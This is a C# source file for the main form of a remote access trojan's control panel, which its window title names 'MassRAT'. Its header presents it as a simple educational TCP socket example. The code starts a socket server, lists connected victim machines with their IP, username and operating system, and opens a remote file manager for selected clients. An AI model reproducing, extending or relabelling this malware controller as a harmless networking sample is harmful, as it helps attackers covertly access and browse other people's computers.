using Server.Networking;
using System;
using System.Collections.Generic;
using System.Threading;
using System.Windows.Forms;
using SharedLibraries.Packet.Commands;
using Server.Settings;
using System.IO;

namespace Server.Forms
{

    /* 
           │ Author       : NYAN CAT
           │ Name         : Simple C# Tcp Socket Example
           │ Contact Me   : github.com/NYAN-x-CAT

           This program is distributed for educational purposes only.
    */


    public partial class FormMain : Form
    {
        public FormMain()
        {
            InitializeComponent();
        }

        private void FormMain_Load(object sender, EventArgs e)
        {
            new SocketServer(Configuration.Port);
        }

        /// <summary>
        /// add client to listview
        /// </summary>
        public void AddClientToListview(SocketClient client, PacketIdentification packet)
        {
            client.ListViewItem = new ListViewItem
            {
                Tag = client,
                Text = client.Socket.RemoteEndPoint.ToString().Split(':')[0],
            };
            client.Identification = packet;
            client.ListViewItem.SubItems.AddRange(new string[] { packet.Type.ToString(), packet.Username, packet.OperatingSystem });

            this.Invoke((MethodInvoker)delegate
            {
                Interlocked.Increment(ref Configuration.ConnectedClients);
                lock (SafeThreading.SyncMainFormListview)
                {
                    this.betterListView1.Items.Add(client.ListViewItem);
                    this.betterListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
                    this.Text = $"MassRAT | By NYAN CAT | Online{Configuration.ConnectedClients}";
                }
            });
        }

        /// <summary>
        /// return array of selected clients
        /// </summary>
        /// <returns></returns>
        public SocketClient[] GetSelectedClients()
        {
            List<SocketClient> clients = new List<SocketClient>();
            this.Invoke((MethodInvoker)delegate
            {
                lock (SafeThreading.SyncMainFormListview)
                {
                    if (betterListView1.SelectedItems.Count == 0) return;
                    foreach (ListViewItem item in betterListView1.SelectedItems)
                    {
                        clients.Add((SocketClient)item.Tag);
                    }
                }
            });
            return clients.ToArray();
        }

        private void FileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                foreach (SocketClient client in GetSelectedClients())
                {
                    if (client.CurrentForms.GetFormFileManager == null)
                    {
                        client.CurrentForms.GetFormFileManager = new FormFileManager
                        {
                            SocketClient = client,
                            Name = $"FileManager {client.Identification.ID}",
                            Text = $"FileManager {client.Identification.ID}",
                        };
                        client.CurrentForms.GetFormFileManager.Show();
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }
    }
}
